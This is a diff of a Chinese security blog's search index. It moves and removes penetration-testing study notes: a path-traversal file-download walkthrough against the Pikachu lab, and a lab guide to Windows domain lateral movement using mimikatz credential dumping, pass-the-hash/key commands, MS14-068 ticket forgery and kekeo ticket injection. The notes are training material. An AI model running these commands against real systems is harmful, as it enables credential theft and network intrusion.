     <content><![CDATA[<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83.png" alt="逻辑越权"></p>
@@ -1212,55 +1261,6 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>逻辑越权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件下载读取</title>
-    <url>/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/</url>
-    <content><![CDATA[<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8.png" alt="文件操作安全"></p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>显示源代码，则为文件读取漏洞</p>
-<p>提示文件下载，则为文件下载漏洞</p>
-<p>文件被解析成脚本语言，则为文件包含漏洞</p>
-<span id="more"></span>
-
-<h2 id="漏洞检测点"><a href="#漏洞检测点" class="headerlink" title="漏洞检测点"></a>漏洞检测点</h2><h3 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h3><p>read.xxx?filename=</p>
-<p>down.xxx?filename=</p>
-<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><p>&amp;readpath=    &amp;filepath=    &amp;path=    &amp;inputfile=    &amp;url=    &amp;data=    &amp;readfile=    &amp;menu=    META-INF=    WEB-INF</p>
-<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>参数值有的会用加密算法进行<strong>加密</strong>，所以在下载想要的文件，需要对该文件路径进行加密</p>
-<h3 id="目录符号"><a href="#目录符号" class="headerlink" title="目录符号"></a>目录符号</h3><p><code>../</code>    <code>..\</code>    <code>./</code>    <code>.\</code>等</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h2 id="常见文件"><a href="#常见文件" class="headerlink" title="常见文件"></a>常见文件</h2><p>后台首页日志等可见文件</p>
-<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p>数据库配置文件下载或读取及后续</p>
-<p>接口密匙信息文件下载或读取及后续</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="pikachu任意文件下载"><a href="#pikachu任意文件下载" class="headerlink" title="pikachu任意文件下载"></a>pikachu任意文件下载</h3><p>访问靶场后查看右键复制图片地址进行查看</p>
-<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
-<p>得到图片地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/download/ai.png</code></p>
-<p>右键复制查看下载地址</p>
-<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
-<p>得到下载地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</code></p>
-<p>现在我们通过漏洞下载<code>execdownload.php</code>文件，查看其源代码，但由于<code>execdownload.php</code>文件在<code>ai.png</code>的上一级目录，所以我们构造的攻击语句为</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure>
-
-<p>得到源码，得到下载漏洞目录是<code>download/</code></p>
-<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp3.png" alt="pikachu任意文件下载-wp3"></p>
-<p>接下来我们通过该漏洞去下载<strong>敏感文件</strong>或<strong>配置文件</strong></p>
-<p>但一般这些文件需要知道绝对路径，我们可以使用扫描器去扫，用大一点的字典去跑</p>
-<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">[RoarCTF 2019]Easy Java</a></h3><p>Java开发的项目文件下载一般用POST传参</p>
-<p>此题读取WEB配置文件WEB-INF/web.xml</p>
-<p><a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a></p>
-<p><a href="https://blog.csdn.net/silencediors/article/details/102579567">https://blog.csdn.net/silencediors/article/details/102579567</a></p>
-<h3 id="“百度杯”CTF比赛-2017-二月场-Zone"><a href="#“百度杯”CTF比赛-2017-二月场-Zone" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-Zone"></a><a href="https://www.ichunqiu.com/battalion?t=1&r=57475">“百度杯”CTF比赛 2017 二月场-Zone</a></h3><p><a href="https://www.ichunqiu.com/writeup/detail/4941">https://www.ichunqiu.com/writeup/detail/4941</a></p>
-<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="小米路由器远程任意文件读取漏洞"><a href="#小米路由器远程任意文件读取漏洞" class="headerlink" title="小米路由器远程任意文件读取漏洞"></a><a href="https://www.seebug.org/vuldb/ssvid-98122">小米路由器远程任意文件读取漏洞</a></h3><h2 id="Java文件下载"><a href="#Java文件下载" class="headerlink" title="Java文件下载"></a>Java文件下载</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
-<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>mvc框架：model view controller</p>
-<p><a href="http://www.baidu.com/link?url=UA_cyTHHSeD2kK_DpzJiSGieQvPpY5mbLBFq_VFEUXTcAOW-Epp3yUjbjrAAWdyD_DrfySzJdTu7haN3brxyUa&wd=&eqid=a8af765e000244620000000661330346"><em>MVC 模式</em> | 菜鸟教程</a></p>
-]]></content>
-      <categories>
-        <category>小迪安全-Web渗透测试笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>文件操作</tag>
-        <tag>文件下载</tag>
-        <tag>文件读取</tag>
       </tags>
   </entry>
   <entry>
@@ -1643,133 +1643,6 @@ set session [session的id]
       </tags>
   </entry>
   <entry>
-    <title>域横向PTH&amp;PTK&amp;PTT哈希票据传递</title>
-    <url>/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&amp;PTK&amp;PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/</url>
-    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PTH-amp-PTT-amp-PTK"><a href="#PTH-amp-PTT-amp-PTK" class="headerlink" title="PTH&amp;PTT&amp;PTK"></a>PTH&amp;PTT&amp;PTK</h3><p>PTH(pass the hash)         利用<strong>lm或ntlm</strong>的值进行的渗透测试</p>
-<p>PTT(pass the ticket)        利用的<strong>票据凭证TGT</strong>进行的渗透测试</p>
-<p>PTK(pass the key)           利用的<strong>ekeys aes256</strong>进行的渗透测试</p>
-<h3 id="PTH和PTK"><a href="#PTH和PTK" class="headerlink" title="PTH和PTK"></a>PTH和PTK</h3><p>PTH原理是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
-<p>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击</p>
-<h4 id="总结KB2871997补丁后的影响"><a href="#总结KB2871997补丁后的影响" class="headerlink" title="总结KB2871997补丁后的影响"></a>总结KB2871997补丁后的影响</h4><p>PTH：没打补丁用户都可以连接，打了补丁只能administrator远程ipc连接</p>
-<p>PTK：打了补丁才能用户都可以连接，采用aes256连接</p>
-<p>查看补丁：用<code>systeminfo</code>命令</p>
-<p>参考：<a href="https://www.freebuf.com/column/220740.html">KB22871997是否真的能防御PTH攻击</a></p>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311233849808.png" alt="image-20220311233849808"></p>
-<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>PTT攻击的部分就不是简单的NTLM认证了，它是利用<strong>Kerberos协议</strong>进行攻击的，这里就介绍三种常见的攻击方法：<strong>MS14-068</strong>，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
-<p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</p>
-<p>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</p>
-<p>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
-<h4 id="Kerberos协议工作方法"><a href="#Kerberos协议工作方法" class="headerlink" title="Kerberos协议工作方法"></a>Kerberos协议工作方法</h4><p>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密（使用krbtgt密码hash作为密钥），发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)。</p>
-<p>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据。</p>
-<p>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测。</p>
-<p>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</p>
-<h2 id="域横向移动PTH传递-mimikatz"><a href="#域横向移动PTH传递-mimikatz" class="headerlink" title="域横向移动PTH传递-mimikatz"></a>域横向移动PTH传递-mimikatz</h2><p>使用mimikatz先获取hash（假设获取到的就是域控的ntlm）</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311230845494.png" alt="image-20220311230845494"></p>
-<p>在未打补丁的工作组及域连接：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment"># domain的值为workgroup时，连接的是本地用户</span></span><br></pre></td></tr></table></figure>
-
-<p>成功会自动创建一个cmd，可以通过该cmd操作对应用户名的机器，如查看C盘目录(若IP地址不识别可以换成计算机名)</p>
-<pre><code>dir \\192.168.3.21\c$
-</code></pre>
-<p>注意：这里/domain:god.org是对域内用户进行PTH，我理解的是经过操作后弹出的cmd具有对域内主机PTH的功能，所以还需要在弹出的cmd中测试出哪个或哪些主机对应该ntlm值(另外用户名也是不确定的)</p>
-<h2 id="域横向移动PTK传递-mimikatz"><a href="#域横向移动PTK传递-mimikatz" class="headerlink" title="域横向移动PTK传递-mimikatz"></a>域横向移动PTK传递-mimikatz</h2><p>打补丁后的工作组及域连接：</p>
-<p>mimikatz获取权限</p>
-<pre><code>privilege::debug
-</code></pre>
-<p>之后获取aes值</p>
-<pre><code>sekurlsa::ekeys
-</code></pre>
-<p>ptk传递</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sekurlsa</span>::pth /user:mary /domain:god.org /aes<span class="number">256</span>:d<span class="number">7</span>c<span class="number">1</span>d<span class="number">9310753</span>a<span class="number">2</span>f<span class="number">7</span>f<span class="number">24035</span>b<span class="number">2701</span>dc<span class="number">1</span>e<span class="number">6177</span>d<span class="number">16</span>a<span class="number">6</span>e<span class="number">40</span>af<span class="number">3</span>c<span class="number">5</span>cdff<span class="number">814719821</span>c<span class="number">4</span>b</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="域横向移动PTT传递-MS14068-amp-kekeo-amp-local"><a href="#域横向移动PTT传递-MS14068-amp-kekeo-amp-local" class="headerlink" title="域横向移动PTT传递-MS14068&amp;kekeo&amp;local"></a>域横向移动PTT传递-MS14068&amp;kekeo&amp;local</h2><h4 id="第一种利用漏洞ms14-068"><a href="#第一种利用漏洞ms14-068" class="headerlink" title="第一种利用漏洞ms14-068"></a>第一种利用漏洞ms14-068</h4><p>能实现普通用户直接获取域控system权限</p>
-<p>1.查看当前sid</p>
-<pre><code>whoami /user
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001825724.png" alt="image-20220312001825724"></p>
-<p>2.启动mimikatz，<strong>不需要提升权限</strong>，能用就行</p>
-<p>清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p>
-<pre><code>kerberos::purge
-</code></pre>
-<p>查看当前机器凭证</p>
-<pre><code>kerberos::list
-</code></pre>
-<p>将票据注入到内存中</p>
-<pre><code>kerberos::ptc 票据文件
-</code></pre>
-<p>3.利用ms14-068生成TGT数据</p>
-<pre><code>ms14-068.exe -u 域成员名@域名 -s sid -d 域控IP地址 -p 域成员密码
-
-# 例
-MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 - p admin!@#45
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001958899.png" alt="image-20220312001958899"></p>
-<p>4.票据注入内存</p>
-<pre><code>kerberos::ptc TGT_mary@god.org.ccache
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002203743.png" alt="image-20220312002203743"></p>
-<p>5.查看凭证列表</p>
-<pre><code>klist
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002227026.png" alt="image-20220312002227026"></p>
-<p>6.利用</p>
-<pre><code>dir \\主机名\c$
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002420045.png" alt="image-20220312002420045"></p>
-<p>这里是对域控攻击所以net time /domain查主机名</p>
-<h3 id="第二种利用工具kekeo"><a href="#第二种利用工具kekeo" class="headerlink" title="第二种利用工具kekeo"></a>第二种利用工具kekeo</h3><p>1.生成票据</p>
-<pre><code>./kekeo &quot;tgt::ask /user:域成员名 /domain:域名 /ntlm:ntlm值&quot;
-
-./kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695d……&quot;
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003010504.png" alt="image-20220312003010504"></p>
-<p>2.导入票据</p>
-<pre><code>kerberos::ptt 票据文件
-
-kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
-</code></pre>
-<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003037687.png" alt="image-20220312003037687"></p>
-<p>3.查看凭证</p>
-<pre><code>klist
-</code></pre>
-<p>4.利用net use载入</p>
-<pre><code>dir \\192.168.3.21\c$
-</code></pre>
-<h3 id="第三种利用本地票据（需管理权限）"><a href="#第三种利用本地票据（需管理权限）" class="headerlink" title="第三种利用本地票据（需管理权限）"></a>第三种利用本地票据（需管理权限）</h3><p>利用<strong>mimikatz</strong>收集本地票据，再将票据导入到内存中进行连接。有存活时间限制（之前有人用这台被拿下的主机连结过域控，就会存在相关凭据，我们的目的就是导出所有凭据，找到与连结过域控的凭据）</p>
-<pre><code>privilege::debug
-
-sekurlsa::tickets /export
-
-kerberos::ptt 票据文件
-</code></pre>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ptt传递不需本地管理员权限，连接时主机名连接，基于漏洞、工具、本地票据</p>
-<h2 id="国产Ladon内网杀器测试-信息收集，连接等"><a href="#国产Ladon内网杀器测试-信息收集，连接等" class="headerlink" title="国产Ladon内网杀器测试-信息收集，连接等"></a>国产Ladon内网杀器测试-信息收集，连接等</h2><p>信息收集-协议扫描-漏洞探针-传递攻击等</p>
-<p>“Wiki”界面有命令介绍</p>
-<p>信息收集</p>
-<p>GUI：“scan”界面选“scan”，“OnlinePC”界面右键选“OnlinePC”扫描</p>
-<p>命令行：Ladon [网段] [关键词]</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
-<p>Kerberos协议工作原理：<a href="https://blog.csdn.net/qq_32005671/article/details/54862678">https://blog.csdn.net/qq_32005671/article/details/54862678</a></p>
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>Ladon：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
-<p>Ladon 9.1.1 &amp; CobaltStrike神龙插件发布：<a href="http://k8gege.org/Ladon/cs911.html">http://k8gege.org/Ladon/cs911.html</a></p>
-<p>kekeo：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
-<p>WindowsExploits/MS14-068：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>内网安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>域横向CobaltStrike&amp;SPN&amp;RDP</title>
     <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&amp;SPN&amp;RDP/</url>
     <content><![CDATA[<h2 id="域横向移动RDP传递-Mimikatz"><a href="#域横向移动RDP传递-Mimikatz" class="headerlink" title="域横向移动RDP传递-Mimikatz"></a>域横向移动RDP传递-Mimikatz</h2><p>获取到的明文密码或HASH密文也可以通过RDP协议（远程桌面）进行连接操作。</p>
@@ -1919,6 +1792,133 @@ python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0
 <p>（Cobalt Strike插件）：<a href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a></p>
 <p>（Cobalt Strike插件）：<a href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a></p>
 <p>（Cobalt Strike插件）：<a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a></p>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域横向PTH&amp;PTK&amp;PTT哈希票据传递</title>
+    <url>/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&amp;PTK&amp;PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/</url>
+    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PTH-amp-PTT-amp-PTK"><a href="#PTH-amp-PTT-amp-PTK" class="headerlink" title="PTH&amp;PTT&amp;PTK"></a>PTH&amp;PTT&amp;PTK</h3><p>PTH(pass the hash)         利用<strong>lm或ntlm</strong>的值进行的渗透测试</p>
+<p>PTT(pass the ticket)        利用的<strong>票据凭证TGT</strong>进行的渗透测试</p>
+<p>PTK(pass the key)           利用的<strong>ekeys aes256</strong>进行的渗透测试</p>
+<h3 id="PTH和PTK"><a href="#PTH和PTK" class="headerlink" title="PTH和PTK"></a>PTH和PTK</h3><p>PTH原理是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
+<p>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击</p>
+<h4 id="总结KB2871997补丁后的影响"><a href="#总结KB2871997补丁后的影响" class="headerlink" title="总结KB2871997补丁后的影响"></a>总结KB2871997补丁后的影响</h4><p>PTH：没打补丁用户都可以连接，打了补丁只能administrator远程ipc连接</p>
+<p>PTK：打了补丁才能用户都可以连接，采用aes256连接</p>
+<p>查看补丁：用<code>systeminfo</code>命令</p>
+<p>参考：<a href="https://www.freebuf.com/column/220740.html">KB22871997是否真的能防御PTH攻击</a></p>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311233849808.png" alt="image-20220311233849808"></p>
+<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>PTT攻击的部分就不是简单的NTLM认证了，它是利用<strong>Kerberos协议</strong>进行攻击的，这里就介绍三种常见的攻击方法：<strong>MS14-068</strong>，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
+<p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</p>
+<p>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</p>
+<p>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
+<h4 id="Kerberos协议工作方法"><a href="#Kerberos协议工作方法" class="headerlink" title="Kerberos协议工作方法"></a>Kerberos协议工作方法</h4><p>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密（使用krbtgt密码hash作为密钥），发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)。</p>
+<p>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据。</p>
+<p>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测。</p>
+<p>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</p>
+<h2 id="域横向移动PTH传递-mimikatz"><a href="#域横向移动PTH传递-mimikatz" class="headerlink" title="域横向移动PTH传递-mimikatz"></a>域横向移动PTH传递-mimikatz</h2><p>使用mimikatz先获取hash（假设获取到的就是域控的ntlm）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220311230845494.png" alt="image-20220311230845494"></p>
+<p>在未打补丁的工作组及域连接：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment"># domain的值为workgroup时，连接的是本地用户</span></span><br></pre></td></tr></table></figure>
+
+<p>成功会自动创建一个cmd，可以通过该cmd操作对应用户名的机器，如查看C盘目录(若IP地址不识别可以换成计算机名)</p>
+<pre><code>dir \\192.168.3.21\c$
+</code></pre>
+<p>注意：这里/domain:god.org是对域内用户进行PTH，我理解的是经过操作后弹出的cmd具有对域内主机PTH的功能，所以还需要在弹出的cmd中测试出哪个或哪些主机对应该ntlm值(另外用户名也是不确定的)</p>
+<h2 id="域横向移动PTK传递-mimikatz"><a href="#域横向移动PTK传递-mimikatz" class="headerlink" title="域横向移动PTK传递-mimikatz"></a>域横向移动PTK传递-mimikatz</h2><p>打补丁后的工作组及域连接：</p>
+<p>mimikatz获取权限</p>
+<pre><code>privilege::debug
+</code></pre>
+<p>之后获取aes值</p>
+<pre><code>sekurlsa::ekeys
+</code></pre>
+<p>ptk传递</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sekurlsa</span>::pth /user:mary /domain:god.org /aes<span class="number">256</span>:d<span class="number">7</span>c<span class="number">1</span>d<span class="number">9310753</span>a<span class="number">2</span>f<span class="number">7</span>f<span class="number">24035</span>b<span class="number">2701</span>dc<span class="number">1</span>e<span class="number">6177</span>d<span class="number">16</span>a<span class="number">6</span>e<span class="number">40</span>af<span class="number">3</span>c<span class="number">5</span>cdff<span class="number">814719821</span>c<span class="number">4</span>b</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="域横向移动PTT传递-MS14068-amp-kekeo-amp-local"><a href="#域横向移动PTT传递-MS14068-amp-kekeo-amp-local" class="headerlink" title="域横向移动PTT传递-MS14068&amp;kekeo&amp;local"></a>域横向移动PTT传递-MS14068&amp;kekeo&amp;local</h2><h4 id="第一种利用漏洞ms14-068"><a href="#第一种利用漏洞ms14-068" class="headerlink" title="第一种利用漏洞ms14-068"></a>第一种利用漏洞ms14-068</h4><p>能实现普通用户直接获取域控system权限</p>
+<p>1.查看当前sid</p>
+<pre><code>whoami /user
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001825724.png" alt="image-20220312001825724"></p>
+<p>2.启动mimikatz，<strong>不需要提升权限</strong>，能用就行</p>
+<p>清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p>
+<pre><code>kerberos::purge
+</code></pre>
+<p>查看当前机器凭证</p>
+<pre><code>kerberos::list
+</code></pre>
+<p>将票据注入到内存中</p>
+<pre><code>kerberos::ptc 票据文件
+</code></pre>
+<p>3.利用ms14-068生成TGT数据</p>
+<pre><code>ms14-068.exe -u 域成员名@域名 -s sid -d 域控IP地址 -p 域成员密码
+
+# 例
+MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 - p admin!@#45
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312001958899.png" alt="image-20220312001958899"></p>
+<p>4.票据注入内存</p>
+<pre><code>kerberos::ptc TGT_mary@god.org.ccache
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002203743.png" alt="image-20220312002203743"></p>
+<p>5.查看凭证列表</p>
+<pre><code>klist
+</code></pre>
